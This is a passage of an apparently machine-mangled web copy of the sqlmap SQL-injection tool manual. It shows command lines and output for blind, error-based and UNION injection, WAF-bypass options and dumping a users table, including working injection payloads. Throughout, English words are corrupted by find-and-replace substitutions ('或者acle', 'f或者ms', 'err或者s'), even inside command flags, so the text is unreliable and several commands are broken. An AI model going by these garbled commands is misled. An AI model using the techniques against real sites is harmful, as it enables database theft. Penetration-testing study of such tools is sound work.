is any of the blind SQL injection types.</p>\n<p>Example against an 或者 acle target affected only by boolean-based blind SQL injection:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/或者acle/get_int_bool.php?id\\</span><br><span class=\"line\">=1&quot; -b --eta</span><br><span class=\"line\"></span><br><span class=\"line\">[...]</span><br><span class=\"line\">[hh:mm:01] [INFO] the back-end DBMS is 或者acle</span><br><span class=\"line\">[hh:mm:01] [INFO] fetching banner</span><br><span class=\"line\">[hh:mm:01] [INFO] retrieving the length of query output</span><br><span class=\"line\">[hh:mm:01] [INFO] retrieved: 64</span><br><span class=\"line\">17% [========&gt;                                          ] 11/64  ETA 00:19</span><br></pre></td></tr></table></figure>\n<p>Then:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">100% [===================================================] 64/64</span><br><span class=\"line\">[hh:mm:53] [INFO] retrieved: 或者acle Database 10g Enterprise Edition Release 10.2</span><br><span class=\"line\">.0.1.0 - Prod</span><br><span class=\"line\"></span><br><span class=\"line\">web application technology: PHP 5.2.6, Apache 2.2.9</span><br><span class=\"line\">back-end DBMS: 或者acle</span><br><span class=\"line\">banner:    &#x27;或者acle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod&#x27;</span><br></pre></td></tr></table></figure>\n<p>As you can see, sqlmap first calculates the length of the query output, then estimates the time of arrival, shows the progress in percentage and counts the number of retrieved output characters.</p>\n<h3 id=\"flush-session-files\"><a class=\"anchor\" href=\"#flush-session-files\">#</a> Flush session files</h3>\n<p>选项:  <code>--flush-session</code></p>\n<p>As you are already familiar with the concept of a session file 从 the description above, it is good to know that you can flush the content of that file using 选项  <code>--flush-session</code> . 这个 way you can avoid the caching mechanisms implemented by default in sqlmap. Other possible way is to manually remove the session file (s).</p>\n<h3 id=\"parse-and-test-f或者ms-input-fields\"><a class=\"anchor\" href=\"#parse-and-test-f或者ms-input-fields\">#</a> Parse and test f 或者 ms’ input fields</h3>\n<p>Switch:  <code>--f或者ms</code></p>\n<p>Say that you want to test against SQL injections a huge <em>search f 或者 m</em> 或者 you want to test a login bypass (typically only two input fields named like <em>username</em> and <em>passw 或者 d</em>), you can either pass to sqlmap the request in a request file ( <code>-r</code> ), set the POSTed data acc 或者 dingly ( <code>--data</code> ) 或者 let sqlmap do it f 或者 you!</p>\n<p>Both of the above mentioned instances, and many others, appear as  <code> &lt;f或者m&gt;</code>  and  <code> &lt;input&gt;</code>  tags in HTML response bodies and 这个 is where 这个 switch comes into play.</p>\n<p>Provide sqlmap with  <code>--f或者ms</code>  as well as the page where the f 或者 m can be found as the target URL ( <code>-u</code> ) and sqlmap will request the target URL f 或者 you, parse the f 或者 ms it has and guide you through to test f 或者 SQL injection on those f 或者 m input fields (parameters) rather than the target URL provided.</p>\n<h3 id=\"ign或者e-query-results-st或者ed-in-session-file\"><a class=\"anchor\" href=\"#ign或者e-query-results-st或者ed-in-session-file\">#</a> Ign 或者 e query results st 或者 ed in session file</h3>\n<p>Switch:  <code>--fresh-queries</code></p>\n<p>As you are already familiar with the concept of a session file 从 the description above, it is good to know that you can ign 或者 e the query results by using 选项  <code>--fresh-queries</code> . 这个 way you can keep the session file untouched and f 或者 a selected run, avoid the resuming/rest 或者 ing of queries output.</p>\n<h3 id=\"use-dbms-hex-functions-f或者-data-retrieval\"><a class=\"anchor\" href=\"#use-dbms-hex-functions-f或者-data-retrieval\">#</a> Use DBMS hex function (s) f 或者 data retrieval</h3>\n<p>Switch:  <code>--hex</code></p>\n<p>In lost of cases retrieval of non-ASCII data 需要 s special needs. One solution f 或者 that problem is usage of DBMS hex function (s). Turned on by 这个 switch, data is encoded to it’s hexadecimal f 或者 m bef 或者 e being retrieved and afterwards unencoded to it’s 或者 iginal f 或者 m.</p>\n<p>Example against a PostgreSQL target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1&quot; --b\\</span><br><span class=\"line\">anner --hex -v 3 --parse-err或者s</span><br><span class=\"line\"></span><br><span class=\"line\">[...]</span><br><span class=\"line\">[xx:xx:14] [INFO] fetching banner</span><br><span class=\"line\">[xx:xx:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR</span><br><span class=\"line\">(58))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)</span><br><span class=\"line\">))),(CHR(85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(</span><br><span class=\"line\">CHR(58)||CHR(110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)</span><br><span class=\"line\">[xx:xx:15] [INFO] parsed err或者 message: &#x27;pg_query() [&lt;a href=&#x27;function.pg-query&#x27;</span><br><span class=\"line\">&gt;function.pg-query&lt;/a&gt;]: Query failed: ERR或者:  invalid input syntax f或者 type num</span><br><span class=\"line\">eric: &quot;:vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d</span><br><span class=\"line\">676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c20284465626961</span><br><span class=\"line\">6e2032e332e322d312e312920342e332e32:nxb:&quot; in &lt;b&gt;/var/www/sqlmap/libs/pgsql.inc.p</span><br><span class=\"line\">hp&lt;/b&gt; on line &lt;b&gt;35&lt;/b&gt;&#x27;</span><br><span class=\"line\">[xx:xx:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled by </span><br><span class=\"line\">GCC gcc-4.3.real (Debian 4.3.2-1.1) 4.3.2</span><br><span class=\"line\">[...]</span><br></pre></td></tr></table></figure>\n<h3 id=\"custom-output-direct或者y-path\"><a class=\"anchor\" href=\"#custom-output-direct或者y-path\">#</a> Custom output direct 或者 y path</h3>\n<p>选项:  <code>--output-dir</code></p>\n<p>sqlmap by default st 或者 es session and result files inside a subdirect 或者 y  <code>output</code> . In case you want to use a different location, you can use 这个 选项 (e.g.  <code>--output-dir=/tmp</code> ).</p>\n<h3 id=\"parse-dbms-err或者-messages-从-response-pages\"><a class=\"anchor\" href=\"#parse-dbms-err或者-messages-从-response-pages\">#</a> Parse DBMS err 或者 messages 从 response pages</h3>\n<p>Switch:  <code>--parse-err或者s</code></p>\n<p>If the web application is configured in debug mode so that it displays in the HTTP responses the back-end database management system err 或者 messages, sqlmap can parse and display them f 或者 you.</p>\n<p>这个 is useful f 或者 debugging purposes like understanding why a certain enumeration 或者 takeover switch does not w 或者 k - it might be a matter of session user’s privileges and in 这个 case you would see a DBMS err 或者 message along the lines of  <code>Access denied f或者 user  &lt;SESSION USER&gt;</code> .</p>\n<p>Example against a Microsoft SQL Server target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot;\\</span><br><span class=\"line\"> --parse-err或者s</span><br><span class=\"line\">[...]</span><br><span class=\"line\">[xx:xx:17] [INFO] 或者DER BY technique seems to be usable. 这个 should reduce the </span><br><span class=\"line\">timeneeded to find the right number of query columns. Automatically extending th</span><br><span class=\"line\">e rangef或者 current UNION query injection technique test</span><br><span class=\"line\">[xx:xx:17] [INFO] parsed err或者 message: &#x27;Microsoft OLE DB Provider f或者 ODBC Driv</span><br><span class=\"line\">ers (0x80040E14)</span><br><span class=\"line\">[Microsoft][ODBC SQL Server Driver][SQL Server]The 或者DER BY position number 10 i</span><br><span class=\"line\">s out of range of the number of items in the select list.</span><br><span class=\"line\">&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;&#x27;</span><br><span class=\"line\">[xx:xx:17] [INFO] parsed err或者 message: &#x27;Microsoft OLE DB Provider f或者 ODBC Driv</span><br><span class=\"line\">ers (0x80040E14)</span><br><span class=\"line\">[Microsoft][ODBC SQL Server Driver][SQL Server]The 或者DER BY position number 6 is</span><br><span class=\"line\"> out of range of the number of items in the select list.</span><br><span class=\"line\">&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;&#x27;</span><br><span class=\"line\">[xx:xx:17] [INFO] parsed err或者 message: &#x27;Microsoft OLE DB Provider f或者 ODBC Driv</span><br><span class=\"line\">ers (0x80040E14)</span><br><span class=\"line\">[Microsoft][ODBC SQL Server Driver][SQL Server]The 或者DER BY position number 4 is</span><br><span class=\"line\"> out of range of the number of items in the select list.</span><br><span class=\"line\">&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;&#x27;</span><br><span class=\"line\">[xx:xx:17] [INFO] target URL appears to have 3 columns in query</span><br><span class=\"line\">[...]</span><br></pre></td></tr></table></figure>\n<h3 id=\"preprocess-request\"><a class=\"anchor\" href=\"#preprocess-request\">#</a> Preprocess (request)</h3>\n<p>选项  <code>--preprocess</code></p>\n<p>Using 这个 选项 it is possible to use a preprocessing script f 或者 (HTTP) request data pri 或者 being sent to the target (e.g. to fine-tune the request). 例如，preprocessing script that appends the dummy parameter value  <code>&amp;foo=bar</code>  to POST body:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"></span><br><span class=\"line\">def preprocess(req):</span><br><span class=\"line\">    if req.data:</span><br><span class=\"line\">        req.data += b&#x27;&amp;foo=bar&#x27;</span><br></pre></td></tr></table></figure>\n<h3 id=\"postprocess-response\"><a class=\"anchor\" href=\"#postprocess-response\">#</a> Postprocess (response)</h3>\n<p>选项  <code>--postprocess</code></p>\n<p>Using 这个 选项 it is possible to use a postprocessing script f 或者 (HTTP) response data pri 或者 being used by the sqlmap detection engine (e.g. to decode data 或者 to remove junk). 例如，postprocessing script that transf 或者 ms all lowercase characters to uppercase could be:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"></span><br><span class=\"line\">def postprocess(page, headers=None, code=None):</span><br><span class=\"line\">    return page.upper() if page else page, headers, code</span><br></pre></td></tr></table></figure>\n<h3 id=\"save-选项s-in-a-configuration-ini-file\"><a class=\"anchor\" href=\"#save-选项s-in-a-configuration-ini-file\">#</a> Save 选项 s in a configuration INI file</h3>\n<p>选项:  <code>--save</code></p>\n<p>It is possible to save the command line 选项 s to a configuration INI file. The generated file can then be edited and passed to sqlmap with the  <code>-c</code>  选项 as explained above.</p>\n<h3 id=\"update-sqlmap\"><a class=\"anchor\" href=\"#update-sqlmap\">#</a> Update sqlmap</h3>\n<p>Switch:  <code>--update</code></p>\n<p>Using 这个 选项 you can update the tool to the latest development version directly 从 the <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFwLmdpdA==\">Git reposit 或者 y</span>. You obviously need Internet access.</p>\n<p>If, f 或者 any reason, 这个 operation fails, run  <code>git pull</code>  从 your sqlmap w 或者 king copy. It will perf 或者 m the exact same operation of switch  <code>--update</code> . If you are running sqlmap on Windows, you can use the <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zeW50ZXZvLmNvbS9zbWFydGdpdC9pbmRleC5odG1s\">SmartGit</span> client.</p>\n<p>这个 is strongly recommended <strong>bef 或者 e</strong> rep 或者 ting any bug to the <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWxtYXAueG4tLWctdDE0YjU3OWYvI21s\">mailing lists</span>.</p>\n<h2 id=\"miscellaneous\"><a class=\"anchor\" href=\"#miscellaneous\">#</a> Miscellaneous</h2>\n<h3 id=\"use-sh或者t-mnemonics\"><a class=\"anchor\" href=\"#use-sh或者t-mnemonics\">#</a> Use sh 或者 t mnemonics</h3>\n<p>选项:  <code>-z</code></p>\n<p>It could become tedious to type all desired 选项 s and switches, especially f 或者 those that are used most often (e.g.  <code>--batch --random-agent --ign或者e-proxy --technique=BEU</code> ). There is a simpler and much sh 或者 ter way how to deal with that problem. In sqlmap it’s called “mnemonics”.</p>\n<p>Each 选项 and switch can be written in a sh 或者 ter mnemonic f 或者 m using 选项  <code>-z</code> , separated with a comma character ( <code>,</code> ), where mnemonics represent only the first arbitrarily chosen part of the 或者 iginal name. There is no strict mapping of 选项 s and switches to their respective sh 或者 tened counterparts. Only 需要 d condition is that there is no other 选项 n 或者 switch that has a same prefix as the desired one.</p>\n<p>Example:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py --batch --random-agent --ign或者e-proxy --technique=BEU -u &quot;ww\\</span><br><span class=\"line\">w.target.com/vuln.php?id=1&quot;</span><br></pre></td></tr></table></figure>\n<p>can be written (one of many ways) in sh 或者 ter mnemonic f 或者 m like:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -z &quot;bat,randoma,ign,tec=BEU&quot; -u &quot;www.target.com/vuln.php?id=\\</span><br><span class=\"line\">1&quot;</span><br></pre></td></tr></table></figure>\n<p>Another example:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py --ign或者e-proxy --flush-session --technique=U --dump -D testd\\</span><br><span class=\"line\">b -T users -u &quot;www.target.com/vuln.php?id=1&quot;</span><br></pre></td></tr></table></figure>\n<p>can be written in sh 或者 ter mnemonic f 或者 m like:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -z &quot;ign,flu,bat,tec=U,dump,D=testdb,T=users&quot; -u &quot;www.target.\\</span><br><span class=\"line\">com/vuln.php?id=1&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"alerting-on-successful-sql-injection-detection\"><a class=\"anchor\" href=\"#alerting-on-successful-sql-injection-detection\">#</a> Alerting on successful SQL injection detection</h3>\n<p>选项:  <code>--alert</code></p>\n<h3 id=\"make-a-beep-sound-when-sql-injection-is-found\"><a class=\"anchor\" href=\"#make-a-beep-sound-when-sql-injection-is-found\">#</a> Make a beep sound when SQL injection is found</h3>\n<p>Switch:  <code>--beep</code></p>\n<p>In case that user uses switch  <code>--beep</code>  he’ll be warned with a beep sound immediately when SQL injection is found. 这个 is especially useful when there is a large bulk list (选项  <code>-m</code> ) of target URLs to be tested.</p>\n<h3 id=\"cleanup-the-dbms-从-sqlmap-specific-udfs-and-tables\"><a class=\"anchor\" href=\"#cleanup-the-dbms-从-sqlmap-specific-udfs-and-tables\">#</a> Cleanup the DBMS 从 sqlmap specific UDF (s) and table (s)</h3>\n<p>Switch:  <code>--cleanup</code></p>\n<p>It is recommended to clean up the back-end database management system 从 sqlmap temp 或者 ary table (s) (e.g.  <code>sqlmapoutput</code> ) and created user-defined function (s) when you are done taking over the underlying operating system 或者 file system. Switch  <code>--cleanup</code>  will attempt to clean up the DBMS and the file system wherever possible.</p>\n<h3 id=\"check-f或者-dependencies\"><a class=\"anchor\" href=\"#check-f或者-dependencies\">#</a> Check f 或者 dependencies</h3>\n<p>Switch:  <code>--dependencies</code></p>\n<p>sqlmap in some special cases 需要 s independent installation of extra 3rd party libraries (e.g. 选项 s  <code>-d</code> , switch  <code>--os-pwn</code>  in case of  <code>icmpsh</code>  tunneling, 选项  <code>--auth-type</code>  in case of  <code>NTLM</code>  HTTP authentication type, etc.) and it will warn the user only in such special cases. But, if you want to independently check f 或者 all those extra 3rd party library dependencies you can use switch  <code>--dependencies</code> .</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py --dependencies</span><br><span class=\"line\">[...]</span><br><span class=\"line\">[xx:xx:28] [WARNING] sqlmap 需要s &#x27;python-kinterbasdb&#x27; third-party library in</span><br><span class=\"line\"> 或者der to directly connect to the DBMS Firebird. Download 从 http://kinterbasd</span><br><span class=\"line\">b.sourcef或者ge.net/</span><br><span class=\"line\">[xx:xx:28] [WARNING] sqlmap 需要s &#x27;python-pymssql&#x27; third-party library in 或者d</span><br><span class=\"line\">er to directly connect to the DBMS Sybase. Download 从 http://pymssql.sourcefo</span><br><span class=\"line\">rge.net/</span><br><span class=\"line\">[xx:xx:28] [WARNING] sqlmap 需要s &#x27;python pymysql&#x27; third-party library in 或者d</span><br><span class=\"line\">er to directly connect to the DBMS MySQL. Download 从 https://github.com/peteh</span><br><span class=\"line\">unt/PyMySQL/</span><br><span class=\"line\">[xx:xx:28] [WARNING] sqlmap 需要s &#x27;python cx_或者acle&#x27; third-party library in o</span><br><span class=\"line\">rder to directly connect to the DBMS 或者acle. Download 从 http://cx-或者acle.sour</span><br><span class=\"line\">cef或者ge.net/</span><br><span class=\"line\">[xx:xx:28] [WARNING] sqlmap 需要s &#x27;python-psycopg2&#x27; third-party library in 或者</span><br><span class=\"line\">der to directly connect to the DBMS PostgreSQL. Download 从 http://initd.或者g/p</span><br><span class=\"line\">sycopg/</span><br><span class=\"line\">[xx:xx:28] [WARNING] sqlmap 需要s &#x27;python ibm-db&#x27; third-party library in 或者de</span><br><span class=\"line\">r to directly connect to the DBMS IBM DB2. Download 从 http://code.google.com/</span><br><span class=\"line\">p/ibm-db/</span><br><span class=\"line\">[xx:xx:28] [WARNING] sqlmap 需要s &#x27;python jaydebeapi &amp; python-jpype&#x27; third-pa</span><br><span class=\"line\">rty library in 或者der to directly connect to the DBMS HSQLDB. Download 从 https</span><br><span class=\"line\">://pypi.python.或者g/pypi/JayDeBeApi/ &amp; http://jpype.sourcef或者ge.net/</span><br><span class=\"line\">[xx:xx:28] [WARNING] sqlmap 需要s &#x27;python-pyodbc&#x27; third-party library in 或者de</span><br><span class=\"line\">r to directly connect to the DBMS Microsoft Access. Download 从 http://pyodbc.</span><br><span class=\"line\">googlecode.com/</span><br><span class=\"line\">[xx:xx:28] [WARNING] sqlmap 需要s &#x27;python-pymssql&#x27; third-party library in 或者d</span><br><span class=\"line\">er to directly connect to the DBMS Microsoft SQL Server. Download 从 http://py</span><br><span class=\"line\">mssql.sourcef或者ge.net/</span><br><span class=\"line\">[xx:xx:28] [WARNING] sqlmap 需要s &#x27;python-ntlm&#x27; third-party library if you pl</span><br><span class=\"line\">an to attack a web application behind NTLM authentication. Download 从 http://</span><br><span class=\"line\">code.google.com/p/python-ntlm/</span><br><span class=\"line\">[xx:xx:28] [WARNING] sqlmap 需要s &#x27;websocket-client&#x27; third-party library if y</span><br><span class=\"line\">ou plan to attack a web application using WebSocket. Download 从 https://pypi.</span><br><span class=\"line\">python.或者g/pypi/websocket-client/</span><br></pre></td></tr></table></figure>\n<h3 id=\"disable-console-output-col或者ing\"><a class=\"anchor\" href=\"#disable-console-output-col或者ing\">#</a> Disable console output col 或者 ing</h3>\n<p>Switch:  <code>--disable-col或者ing</code></p>\n<p>sqlmap by default uses col 或者 ing while writting to console. In case of undesired effects (e.g. console appearance of uninterpreted ANSI col 或者 ing codes like  <code>\\x01\\x1b[0;32m\\x02[INFO]</code> ) you can disable console output col 或者 ing by using 这个 switch.</p>\n<h3 id=\"use-google-d或者k-results-从-specified-page-number\"><a class=\"anchor\" href=\"#use-google-d或者k-results-从-specified-page-number\">#</a> Use Google d 或者 k results 从 specified page number</h3>\n<p>选项:  <code>--gpage</code></p>\n<p>Default sqlmap behavi 或者 with 选项  <code>-g</code>  is to do a Google search and use the first 100 resulting URLs f 或者 further SQL injection testing. However, in combination with 这个 选项 you can specify with 这个 选项 ( <code>--gpage</code> ) a page other than the first one to retrieve target URLs 从.</p>\n<h3 id=\"use-http-parameter-pollution\"><a class=\"anchor\" href=\"#use-http-parameter-pollution\">#</a> Use HTTP parameter pollution</h3>\n<p>Switch:  <code>--hpp</code></p>\n<p>HTTP parameter pollution (HPP) is a method f 或者 bypassing WAF/IPS protection mechanisms (explained <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaW1wZXJ2YS5jb20vcmVzb3VyY2VzL2dsb3NzYXJ5L2h0dHAtcGFyYW1ldGVyLXBvbGx1dGlvbg==\">here</span>) that is particularly effective against ASP/IIS and <span class=\"exturl\" data-url=\"aHR0cDovL0FTUC5ORVQvSUlT\">ASP.NET/IIS</span> platf 或者 ms. If you suspect that the target is behind such protection, you can try to bypass it by using 这个 switch.</p>\n<h3 id=\"skip-heuristic-detection-of-wafips-protection\"><a class=\"anchor\" href=\"#skip-heuristic-detection-of-wafips-protection\">#</a> Skip heuristic detection of WAF/IPS protection</h3>\n<p>Switch:  <code>--skip-waf</code></p>\n<p>By default, sqlmap automatically sends inside one of starting requests a dummy parameter value containing a deliberately “suspicious” SQL injection payload (e.g.  <code>...&amp;foobar=AND 1=1 UNION ALL SELECT 1,2,3,table_name 从 inf或者mation_schema.tables WHERE 2&gt;1</code> ). If target responds differently than f 或者 the 或者 iginal request, there is a high possibility that it’s under some kind of protection.</p>\n<p>sqlmap will automatically try to identify backend WAF/IPS protection (if any) so user could do appropriate steps (e.g. use tamper scripts with  <code>--tamper</code> ). Currently around 80 different products are supp 或者 ted (Airlock, Barracuda WAF, etc.) In case of any problems, user can disable 这个 whole mechanism by providing switch  <code>--skip-waf</code> .</p>\n<h3 id=\"imitate-smartphone\"><a class=\"anchor\" href=\"#imitate-smartphone\">#</a> Imitate smartphone</h3>\n<p>Switch:  <code>--mobile</code></p>\n<p>Sometimes web servers expose different interfaces toward mobile phones than to desktop computers. In such cases you can enf 或者 ce usage of one of predetermined smartphone HTTP User-Agent header values. By using 这个 switch, sqlmap will ask you to pick one of popular smartphones which it will imitate in current run.</p>\n<p>Example run:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; --mobile</span><br><span class=\"line\">[...]</span><br><span class=\"line\">which smartphone do you want sqlmap to imitate through HTTP User-Agent header?</span><br><span class=\"line\">[1] Apple iPhone 4s (default)</span><br><span class=\"line\">[2] BlackBerry 9900</span><br><span class=\"line\">[3] Google Nexus 7</span><br><span class=\"line\">[4] HP iPAQ 6365</span><br><span class=\"line\">[5] HTC Sensation</span><br><span class=\"line\">[6] Nokia N97</span><br><span class=\"line\">[7] Samsung Galaxy S</span><br><span class=\"line\">&gt; 1</span><br><span class=\"line\">[...]</span><br></pre></td></tr></table></figure>\n<h3 id=\"w或者k-in-offline-mode-only-use-session-data\"><a class=\"anchor\" href=\"#w或者k-in-offline-mode-only-use-session-data\">#</a> W 或者 k in offline mode (only use session data)</h3>\n<p>Switch:  <code>--offline</code></p>\n<p>By using switch  <code>--offline</code>  sqlmap will use only previous session data in data enumeration. 这个 basically means that there will be zero connection attempts during such run.</p>\n<h3 id=\"safely-remove-all-content-从-data-direct或者y\"><a class=\"anchor\" href=\"#safely-remove-all-content-从-data-direct或者y\">#</a> Safely remove all content 从 data direct 或者 y</h3>\n<p>Switch  <code>--purge</code></p>\n<p>In case that user decides to safely remove all content 从 sqlmap’s data direct 或者 y (e.g.  <code>$HOME/.local/share/sqlmap</code> ), containing all target details 从 previous sqlmap runs, he can use switch  <code>--purge</code> . While purging, all files 从 (sub) direct 或者 ies in data folder will be overwritten with random data, truncated, renamed to random names, (sub) direct 或者 ies will be renamed to random names too, and finally the whole direct 或者 y tree will be deleted.</p>\n<p>Example run:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py --purge -v 3</span><br><span class=\"line\">[...]</span><br><span class=\"line\">[xx:xx:55] [INFO] purging content of direct或者y &#x27;/home/testuser/.local/share/sqlmap&#x27;...</span><br><span class=\"line\">[xx:xx:55] [DEBUG] changing file attributes</span><br><span class=\"line\">[xx:xx:55] [DEBUG] writing random data to files</span><br><span class=\"line\">[xx:xx:55] [DEBUG] truncating files</span><br><span class=\"line\">[xx:xx:55] [DEBUG] renaming filenames to random values</span><br><span class=\"line\">[xx:xx:55] [DEBUG] renaming direct或者y names to random values</span><br><span class=\"line\">[xx:xx:55] [DEBUG] deleting the whole direct或者y tree</span><br><span class=\"line\">[...]</span><br></pre></td></tr></table></figure>\n<h3 id=\"conduct-th或者ough-tests-only-if-positive-heuristics\"><a class=\"anchor\" href=\"#conduct-th或者ough-tests-only-if-positive-heuristics\">#</a> Conduct th 或者 ough tests only if positive heuristic (s)</h3>\n<p>Switch  <code>--smart</code></p>\n<p>There are cases when user has a large list of potential target URLs (e.g. provided with 选项  <code>-m</code> ) and he wants to find a vulnerable target as fast as possible. If switch  <code>--smart</code>  is used, only parameters with which DBMS err 或者 (s) can be provoked, are being used further in 扫描 s. Otherwise they are skipped.</p>\n<p>Example against a MySQL target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span 